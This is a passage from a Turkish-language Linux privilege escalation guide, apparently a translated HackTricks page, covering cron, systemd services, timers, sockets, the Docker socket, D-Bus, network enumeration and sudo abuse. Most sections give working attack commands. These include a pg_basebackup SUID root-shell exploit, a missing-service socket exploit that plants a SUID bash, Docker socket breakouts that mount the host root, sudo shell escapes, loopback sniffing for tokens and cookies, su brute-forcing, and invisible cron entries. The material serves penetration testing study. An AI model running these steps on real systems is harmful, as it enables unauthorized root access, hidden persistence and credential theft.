- `openat()`: güvenilen bir dizin dosya tanıtıcısına göre işlem yapar.
- `mkstemp()`: geçici dosyaları güvenli izinlerle atomik olarak oluşturur.

### Yazılabilir payload içeren özel imzalı cron binary'leri
Root cron job'ının çalıştırdığı tam binary'yi yazabilen sıradan bir kullanıcı bir ayrıcalık sınırını aşabilir; ancak özel bir imza denetimi imzasız bir değişikliği reddedebilir. Belgelenen durumda, root'a ait ELF dosyasının modu `0760` idi; bu, grubun bir üyesinin dosyaya yazmasına, root sahibinin ise dosyayı çalıştırmasına olanak tanıyordu. Görünür bir süreç izlemesi, job binary'yi çalıştırmadan önce `objcopy`'nin `.text_sig` bölümünü çıkardığını gösterdi; doğrulayıcı betiğin tamamı okunamıyordu.<sup>[[2]](#references)</sup>

Başarılı olan değişiklik, sızdırılmış özel imzalama materyali kullanılarak bir ELF signer ile imzalandı. [Biçim belgeleri](https://github.com/NUAA-WatchDog/linux-elf-binary-signer), çalıştırılabilir dosyanın `.text` bölümünden türetilen bir imza bölümünü açıklar. Yalnızca bir sertifika veya eşleşen bir dizgeyi `.text_sig` bölümüne eklemenin, görünmeyen doğrulayıcıyı geçmek için yeterli olduğu gösterilmemiştir. Yazılabilir ve imzalı bir binary'nin istismar edilebilir olduğu sonucuna varmadan önce gerçek zamanlanmış yolu, etkin yazma erişimini, root tarafından çağrılma durumunu ve doğrulayıcı politikasını kontrol edin. Tek başına bir `.text_sig` bölümü yalnızca incelemeye yönelik bir ipucudur.

### Sık çalışan cron job'ları

Her 1, 2 veya 5 dakikada bir çalıştırılan süreçleri bulmak için süreçleri izleyebilirsiniz. Belki bundan yararlanıp ayrıcalıkları yükseltebilirsiniz.

Örneğin, **1 dakika boyunca her 0.1 saniyede bir izlemek**, **en az çalıştırılan komutlara göre sıralamak** ve en çok çalıştırılan komutları silmek için şunu yapabilirsiniz:

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

**Ayrıca** [**pspy**](https://github.com/DominicBreuker/pspy/releases) kullanabilirsiniz (bu araç başlayan her süreci izler ve listeler).

### Saldırganın belirlediği mode bitlerini koruyan root yedekleri (pg_basebackup)

Root'a ait bir cron, yazma izniniz olan bir veritabanı dizininde `pg_basebackup` (veya herhangi bir recursive copy) çalıştırıyorsa, yedekleme çıktısına aynı mode bitleriyle **root:root** olarak yeniden kopyalanacak bir **SUID/SGID binary** yerleştirebilirsiniz.<sup>[[26]](#references)</sup>

Tipik keşif akışı (düşük yetkili bir DB kullanıcısı olarak):
- Her dakika `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` gibi bir komut çalıştıran root cron'u tespit etmek için `pspy` kullanın.
- Kaynak cluster'ın (ör. `/var/lib/postgresql/14/main`) sizin tarafınızdan yazılabilir olduğunu ve iş tamamlandıktan sonra hedefin (`/opt/backups/current`) root'a ait olduğunu doğrulayın.

Exploit:

```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```

Bu, `pg_basebackup` küme kopyalanırken dosya izin bitlerini koruduğu için mümkündür; root tarafından çalıştırıldığında hedef dosyalar **root sahipliğini + saldırganın seçtiği SUID/SGID bitlerini** devralır. İzinleri koruyup yürütülebilir bir konuma yazan benzer ayrıcalıklı yedekleme/kopyalama rutinleri de savunmasızdır.

### Görünmez cron job'ları

Bir cronjob'a **yorum satırından sonra satır başı karakteri olmadan bir carriage return** eklemek mümkündür; cron job çalışmaya devam eder. Örnek (carriage return karakterine dikkat edin):

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

Bu tür gizli bir girişi tespit etmek için, kontrol karakterlerini gösteren araçlarla cron dosyalarını inceleyin:

```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```

## Servisler

### Yazılabilir _.service_ dosyaları

Herhangi bir `.service` dosyasına yazıp yazamadığınızı kontrol edin. Yazabiliyorsanız, hizmet başlatıldığında, yeniden başlatıldığında veya durdurulduğunda backdoor’unuzu **çalıştırmasını** sağlamak için dosyayı **değiştirebilirsiniz** (makinenin yeniden başlatılmasını beklemeniz gerekebilir).\
Örneğin, backdoor’unuzu `.service` dosyasına **`ExecStart=/tmp/script.sh`** ile ekleyin.

### Yazılabilir hizmet binary’leri

Hizmetler tarafından çalıştırılan binary’lere **yazma izniniz** varsa, bunları backdoor’larla değiştirebilirsiniz. Böylece hizmetler yeniden çalıştırıldığında backdoor’lar da çalıştırılır.

### systemd PATH - Göreli Yollar

**systemd** tarafından kullanılan PATH’i şu komutla görebilirsiniz:

```bash
systemctl show-environment
```

Yol üzerindeki klasörlerden herhangi birine **yazabiliyorsanız**, **yetkilerinizi yükseltebilirsiniz**. Şunlar gibi servis yapılandırma dosyalarında kullanılan **göreli yolları** aramanız gerekir:

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

Ardından, yazma izniniz olan systemd PATH klasöründe göreli yol ikilisiyle **aynı ada sahip bir çalıştırılabilir dosya** oluşturun. Hizmetten güvenlik açığı bulunan işlemi (**Start**, **Stop**, **Reload**) gerçekleştirmesi istendiğinde **backdoor’unuz çalıştırılır** (yetkisiz kullanıcılar genellikle hizmetleri başlatamaz/durduramaz, ancak `sudo -l` kullanıp kullanamayacağınızı kontrol edin).

**Hizmetler hakkında daha fazla bilgi için `man systemd.service` komutunu kullanın.**

## **Zamanlayıcılar**

**Zamanlayıcılar**, adları `**.timer**` ile biten, `**.service**` dosyalarını veya olayları denetleyen systemd birim dosyalarıdır. **Zamanlayıcılar**, takvim saatine dayalı ve monotonik zaman olayları için yerleşik desteğe sahip olduklarından cron'a alternatif olarak kullanılabilir ve eşzamansız çalıştırılabilir.

Tüm zamanlayıcıları şu komutla listeleyebilirsiniz:

```bash
systemctl list-timers --all
```

### Yazılabilir zamanlayıcılar

Bir zamanlayıcıyı değiştirebiliyorsanız, systemd.unit’in bazı birimlerini (ör. `.service` veya `.target`) çalıştırmasını sağlayabilirsiniz.

```bash
Unit=backdoor.service
```

Dokümantasyonda Unit hakkında şunları okuyabilirsiniz:

> Bu zamanlayıcı sona erdiğinde etkinleştirilecek birim. Argüman, son eki ".timer" olmayan birim adıdır. Belirtilmezse bu değer, son eki hariç zamanlayıcı birimiyle aynı ada sahip bir hizmet olarak varsayılan değerini alır. (Yukarıya bakın.) Etkinleştirilen birim adı ile zamanlayıcı biriminin adının, son ek dışında aynı olması önerilir.

Bu nedenle, bu izni kötüye kullanmak için şunları yapmanız gerekir:

- **Yazılabilir bir ikili dosya çalıştıran** bir systemd birimi (ör. `.service`) bulun
- **Göreli bir yol çalıştıran** ve **systemd PATH** üzerinde **yazma ayrıcalıklarına** sahip olduğunuz bir systemd birimi bulun (bu çalıştırılabilir dosyayı taklit etmek için)

**Zamanlayıcılar hakkında daha fazla bilgi için `man systemd.timer` komutunu kullanın.**

### **Zamanlayıcıyı Etkinleştirme**

Bir zamanlayıcıyı etkinleştirmek için root ayrıcalıklarına ihtiyacınız vardır. Şunu çalıştırın:

```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

**timer**, `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` konumunda bir symlink oluşturularak **etkinleştirilir**.

## Sockets

Unix Domain Sockets (UDS), istemci-sunucu modellerinde aynı veya farklı makinelerde **process iletişimini** sağlar. Bilgisayarlar arası iletişim için standart Unix tanımlayıcı dosyalarını kullanır ve `.socket` dosyaları aracılığıyla kurulur.<sup>[[14]](#references)</sup>

Sockets, `.socket` dosyaları kullanılarak yapılandırılabilir.

**Sockets hakkında `man systemd.socket` ile daha fazla bilgi edinin.** Bu dosyada birkaç ilgi çekici parametre yapılandırılabilir:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Bu seçenekler birbirinden farklıdır, ancak özetle socket'in **nerede dinleme yapacağını belirtmek** için kullanılırlar (AF_UNIX socket dosyasının yolu, dinlenecek IPv4/6 adresi ve/veya port numarası vb.).
- `Accept`: Boolean bir değer alır. **true** ise her gelen bağlantı için bir **service instance başlatılır** ve ona yalnızca bağlantı socket'i aktarılır. **false** ise dinleyen socket'lerin tümü **başlatılan service unit'e aktarılır** ve tüm bağlantılar için yalnızca bir service unit başlatılır. Bu değer, gelen tüm trafiği koşulsuz olarak tek bir service unit'in işlediği datagram sockets ve FIFOs için yok sayılır. **Varsayılanı false** değeridir. Performans nedenleriyle, yeni daemon'ların yalnızca `Accept=no` için uygun olacak şekilde yazılması önerilir.
- `ExecStartPre`, `ExecStartPost`: Bir veya daha fazla komut satırı alır. Bunlar, dinleyen **sockets**/FIFOs sırasıyla oluşturulup bağlanmadan **önce** veya **sonra** çalıştırılır. Komut satırının ilk öğesi mutlak bir dosya adı olmalı, ardından process için argümanlar gelmelidir.
- `ExecStopPre`, `ExecStopPost`: Dinleyen **sockets**/FIFOs sırasıyla kapatılıp kaldırılmadan **önce** veya **sonra** çalıştırılan ek **komutlar**.
- `Service`: **Gelen trafikte etkinleştirilecek** **service** unit adını belirtir. Bu ayara yalnızca Accept=no olan sockets için izin verilir. Varsayılan olarak socket ile aynı adı taşıyan service kullanılır (son ek değiştirilir). Çoğu durumda bu seçeneği kullanmak gerekmez.

### Yazılabilir .socket dosyaları

**Yazılabilir** bir `.socket` dosyası bulursanız, `[Socket]` bölümünün başına `ExecStartPre=/home/kali/sys/backdoor` gibi bir şey **ekleyebilirsiniz**; böylece backdoor, socket oluşturulmadan önce çalıştırılır. Bu nedenle **muhtemelen makine yeniden başlatılana kadar beklemeniz gerekecektir.**\
_Sistemin bu socket dosyası yapılandırmasını kullanıyor olması gerektiğini unutmayın; aksi takdirde backdoor çalıştırılmaz._

### Socket activation + yazılabilir unit yolu (eksik service oluşturma)

Etki düzeyi yüksek bir diğer yanlış yapılandırma şudur:

- `Accept=no` olan ve `Service=<name>.service` belirten bir socket unit
- referans verilen service unit eksik
- bir saldırgan `/etc/systemd/system` (veya başka bir unit arama yolu) içine yazabilir

Bu durumda saldırgan `<name>.service` oluşturabilir, ardından systemd'nin yeni service'i root olarak yükleyip çalıştırması için socket'e trafik gönderebilir.

Hızlı akış:

```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```

### Yazılabilir soketler

Herhangi bir **yazılabilir soket** tespit ederseniz (_burada Unix Sockets'tan bahsediyoruz, config `.socket` dosyalarından değil_), bu soketle **iletişim kurabilir** ve belki bir güvenlik açığını exploit edebilirsiniz.

### Unix Sockets'ı listeleyin

```bash
netstat -a -p --unix
```

### Ham bağlantı

```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```

**Exploitation örneği:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTP soketleri

HTTP isteklerini dinleyen bazı **soketler** olabilir (_ .socket dosyalarından değil, unix socket olarak işlev gören dosyalardan bahsediyorum_). Bunu şu komutla kontrol edebilirsiniz:

```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```

Soket **bir HTTP isteğine yanıt veriyorsa**, onunla **iletişim kurabilir** ve belki de **bir güvenlik açığından yararlanabilirsiniz**.

### Yazılabilir Docker Soketi

Genellikle `/var/run/docker.sock` konumunda bulunan Docker soketi, güvenliği sağlanması gereken kritik bir dosyadır. Varsayılan olarak `root` kullanıcısı ve `docker` grubunun üyeleri bu dosyaya yazabilir. Bu sokete yazma erişimine sahip olmak, ayrıcalık yükseltmeye yol açabilir. Aşağıda bunun nasıl yapılabileceği ve Docker CLI kullanılamıyorsa başvurulabilecek alternatif yöntemler açıklanmıştır.

#### **Docker CLI ile Ayrıcalık Yükseltme**

Docker soketine yazma erişiminiz varsa aşağıdaki komutları kullanarak ayrıcalıklarınızı yükseltebilirsiniz:<sup>[[15]](#references)</sup>

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

These komutlar, host'un dosya sistemine root düzeyinde erişimi olan bir container çalıştırmanızı sağlar.

#### **Docker API'sini Doğrudan Kullanma**

Docker CLI kullanılamadığında, Unix socket üzerinden ham HTTP kullanarak Docker socket'i yine de kötüye kullanılabilir. En güvenilir yöntem şu şekildedir:

- host'un root dizinini bind mount ile bağlayarak uzun süre çalışan bir yardımcı container oluşturun
- container'ı başlatın
- yardımcı container içinde bir `exec` instance oluşturun
- `exec` instance'ı başlatın ve çıktıyı API üzerinden geri okuyun

**Docker image'larını listeleme**

```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

**Bir yardımcı container oluşturun ve başlatın**

```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
  "http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.47/containers/${HELPER}/start"
```

**Bir exec örneği oluştur**

```bash
EXEC_ID=$(
  curl -s --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
    "http://localhost/v1.47/containers/${HELPER}/exec" \
  | tr -d '\n' \
  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```

**exec instance'ı başlatın ve çıktıyı okuyun**

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":true}' \
  "http://localhost/v1.47/exec/${EXEC_ID}/start"
```

Bu yaklaşım genellikle `attach` işlemini `socat` veya `nc -U` ile manuel olarak yürütmeye çalışmaktan daha güvenilirdir. `/:/host` ile bir yardımcı oluşturabildiğinizde, `/host/root/...` gibi dosyaları okumak, `/host/root/.ssh` altına SSH anahtarları eklemek veya host başlangıç dosyalarını değiştirmek için ek `exec` örnekleri kullanabilirsiniz.

### Diğerleri

Docker socket üzerinde yazma izniniz varsa ve **`docker` grubunun içindeyseniz**, [**ayrıcalıkları yükseltmenin başka yolları da vardır**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). [**Docker API bir portu dinliyorsa**](../../../network-services-pentesting/2375-pentesting-docker.md#compromising) onu da ele geçirebilirsiniz.

**Container'lardan kaçmanın veya ayrıcalıkları yükseltmek için container runtime'larını kötüye kullanmanın diğer yollarını** şurada inceleyin:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Containerd (ctr) ayrıcalık yükseltme

**`ctr`** komutunu kullanabildiğinizi fark ederseniz, **ayrıcalıkları yükseltmek için onu kötüye kullanabilirsiniz**; bu nedenle aşağıdaki sayfayı okuyun:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** ayrıcalık yükseltme

**`runc`** komutunu kullanabildiğinizi fark ederseniz, **ayrıcalıkları yükseltmek için onu kötüye kullanabilirsiniz**; bu nedenle aşağıdaki sayfayı okuyun:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus, uygulamaların verimli bir şekilde etkileşim kurmasını ve veri paylaşmasını sağlayan gelişmiş bir **Process'ler Arası İletişim (IPC) sistemidir**. Modern Linux sistemleri göz önünde bulundurularak tasarlanmış olup, farklı uygulama iletişimi biçimleri için sağlam bir çerçeve sunar.<sup>[[16]](#references)</sup>

Sistem esnektir; process'ler arasındaki veri alışverişini geliştiren temel IPC'yi destekler ve bu yönüyle **geliştirilmiş UNIX domain socket'lerini** andırır. Ayrıca olayların veya sinyallerin yayınlanmasına yardımcı olarak sistem bileşenleri arasında sorunsuz entegrasyon sağlar. Örneğin, gelen bir aramayı bildiren Bluetooth daemon'undan gelen bir sinyal, müzik çaların sesini kapatmasını sağlayarak kullanıcı deneyimini iyileştirebilir. Ek olarak D-Bus, uzak nesne sistemini destekleyerek uygulamalar arasındaki servis isteklerini ve yöntem çağrılarını basitleştirir; böylece geleneksel olarak karmaşık olan süreçleri kolaylaştırır.

D-Bus, mesaj izinlerini (yöntem çağrıları, sinyal yayınları vb.) eşleşen politika kurallarının kümülatif etkisine göre yöneten bir **allow/deny modeli** kullanır. Bu politikalar bus ile etkileşimleri belirler ve bu izinlerin istismar edilmesi yoluyla ayrıcalık yükseltmeye olanak sağlayabilir.

`/etc/dbus-1/system.d/wpa_supplicant.conf` dosyasındaki böyle bir politika örneğinde, root kullanıcısının `fi.w1.wpa_supplicant1` nesnesine sahip olma, ona mesaj gönderme ve ondan mesaj alma izinleri ayrıntılı olarak belirtilmiştir.

Belirli bir kullanıcı veya grup belirtilmeyen politikalar evrensel olarak uygulanırken, "default" bağlam politikaları diğer özel politikaların kapsamına girmeyen her şeye uygulanır.

```xml
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

**D-Bus iletişimini nasıl enumerate edip exploit edeceğinizi burada öğrenin:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Ağ**

Ağı enumerate etmek ve makinenin konumunu belirlemek her zaman ilgi çekicidir.

### Genel enumeration

```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```

Etkin bir `/etc/inetd.conf` girdisi GNU Inetutils `telnetd`'yi root olarak çalıştırıyorsa, port yalnızca loopback'e bağlı olsa bile yapılandırılmış binary sürümünü ve yerel listener'ı kontrol edin. GNU Inetutils 1.9.3 ile 2.7 arasındaki sürümlerde, istemcinin sağladığı `USER` değerinin `login -f` komutuna ulaştığı bir [telnet authentication bypass](https://seclists.org/oss-sec/2026/q1/89) vardı (CVE-2026-24061). Bir process veya sürüm dizesi yalnızca bir göstergedir; servisin açığa çıktığını varsaymadan önce vendor patch durumunu ve gerçek daemon'ı doğrulayın. [Telnet guide](../../../network-services-pentesting/pentesting-telnet.md) daha fazla ayrıntı içerir.

### Outbound filtering için hızlı ön değerlendirme

Host komut çalıştırabiliyor ancak callback'ler başarısız oluyorsa DNS, transport, proxy ve route filtrelemesini hızla birbirinden ayırın:

```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```

### Açık portlar

Makineye erişmeden önce, daha önce etkileşim kuramadığınız ve makinede çalışan ağ hizmetlerini daima kontrol edin:

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```

Dinleyicileri bind hedeflerine göre sınıflandırın:

- `0.0.0.0` / `[::]`: tüm yerel arayüzlerde erişime açık.
- `127.0.0.1` / `::1`: yalnızca yerel erişime açık (tünel/forward için iyi adaylar).
- Belirli dahili IP'ler (ör. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): genellikle yalnızca dahili segmentlerden erişilebilir.

### Yalnızca yerel servisler için inceleme iş akışı

Bir hostu ele geçirdiğinizde, `127.0.0.1` adresine bağlı servisler çoğu zaman ilk kez shell'inizden erişilebilir hâle gelir. Hızlı bir yerel iş akışı şöyledir:

```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```

### Ağ tarayıcısı olarak LinPEAS (yalnızca ağ modu)

Yerel PE kontrollerinin yanı sıra linPEAS, hedef odaklı bir ağ tarayıcısı olarak çalışabilir. `$PATH` içindeki kullanılabilir ikili dosyaları (genellikle `fping`, `ping`, `nc`, `ncat`) kullanır ve araç yüklemez.

```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```

`-t` olmadan `-d`, `-p` veya `-i` verirseniz linPEAS, salt bir ağ tarayıcısı olarak çalışır (ayrıcalık yükseltme kontrollerinin geri kalanını atlar).

### Sniffing

Trafiği sniff edip edemediğinizi kontrol edin. Edebiliyorsanız bazı kimlik bilgilerini ele geçirebilirsiniz.

```
timeout 1 tcpdump
```

Hızlı uygulamalı kontroller:

```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```

Loopback (`lo`), post-exploitation aşamasında özellikle değerlidir; çünkü yalnızca dahili servislerin çoğu burada token/cookie/kimlik bilgilerini açığa çıkarır:

```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
  | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```

Şimdi yakala, sonra ayrıştır:

```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```

## Users

### Genel Enumerasyon

**Kim** olduğunuzu, hangi **yetkilere** sahip olduğunuzu, sistemlerde hangi **kullanıcıların** bulunduğunu, hangilerinin **login** olabildiğini ve hangilerinin **root yetkilerine** sahip olduğunu kontrol edin:

```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```

### Büyük UID

Bazı Linux sürümleri, **UID > INT_MAX** olan kullanıcıların yetkilerini yükseltmesine olanak tanıyan bir hatadan etkilenmişti. Daha fazla bilgi: [burada](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [burada](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) ve [burada](https://twitter.com/paragonsec/status/1071152249529884674).<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**Exploit etmek** için şunu kullanın: **`systemd-run -t /bin/bash`**

### Gruplar

Root yetkileri kazanmanızı sağlayabilecek bir **grubun üyesi olup olmadığınızı** kontrol edin:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Pano

Panoda ilginç bir şey olup olmadığını kontrol edin (mümkünse)

```bash
if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi
```

### Şifre Politikası

```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```

### Bilinen parolalar

Ortamın **herhangi bir parolasını biliyorsanız**, bu parolayı kullanarak **her kullanıcı olarak giriş yapmayı deneyin**.

### Su Brute

Çok fazla gürültü çıkarmayı sorun etmiyorsanız ve bilgisayarda `su` ve `timeout` binary'leri varsa, [su-bruteforce](https://github.com/carlospolop/su-bruteforce) kullanarak kullanıcılar üzerinde brute-force deneyebilirsiniz.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) de `-a` parametresiyle kullanıcılar üzerinde brute-force denemeye çalışır.

## Yazılabilir PATH istismarları

### $PATH

$PATH içindeki bir klasöre **yazabildiğinizi** fark ederseniz, yazılabilir klasörün içinde **bir backdoor oluşturarak** ayrıcalıkları yükseltebilirsiniz. Bu backdoor, farklı bir kullanıcı (ideal olarak root) tarafından çalıştırılacak ve $PATH içinde yazılabilir klasörünüzden önce gelen bir klasörden **yüklenmeyen** bir komutla aynı adı taşımalıdır.

### SUDO ve SUID

Bir komutu sudo kullanarak çalıştırmanıza izin verilebilir veya komutun suid biti ayarlanmış olabilir. Bunu şu komutla kontrol edin:

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

Bazı **beklenmedik komutlar dosyaları okumanıza ve/veya yazmanıza, hatta bir komut çalıştırmanıza olanak tanır**.<sup>[[8]](#references)</sup> Örneğin:

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

Sudo yapılandırması, bir kullanıcının parolayı bilmeden başka bir kullanıcının yetkileriyle bazı komutları çalıştırmasına izin verebilir.

```
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

Bu örnekte `demo` kullanıcısı `vim`'i `root` olarak çalıştırabilir; artık root dizinine bir SSH anahtarı ekleyerek veya `sh` çağırarak shell elde etmek çok kolaydır.

```
sudo vim -c '!sh'
```

### sudo betiğinde tırnak içine alınmamış Bash karşılaştırması

Bash'te `[[ "$protected" == $candidate ]]` ifadesinin sağ tarafı bir kalıptır. Root yetkisiyle çalışabilen bir sudo betiği `candidate` değerini çağıranın kontrolündeki bir dosyadan alıyorsa `prefix*` gibi bir değer, korunan bir dizenin başlangıcıyla eşleşebilir. Farklı başarı ve hata yolları, bir önek oracle'ı açığa çıkarabilir. Amaç tam eşleşmeyse sağ tarafı tırnak içine alın (`[[ "$protected" == "$candidate" ]]`). Tırnak içine alınmamış bir karşılaştırmanın istismar edilebilir olduğuna karar vermeden önce gerçek sudo argümanlarını, girdinin kaynağını ve gözlemlenebilir dal davranışını inceleyin. [GNU Bash kılavuzu](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html) bu kalıp davranışını tanımlar.

### sudo altında PrusaSlicer proje dosyaları

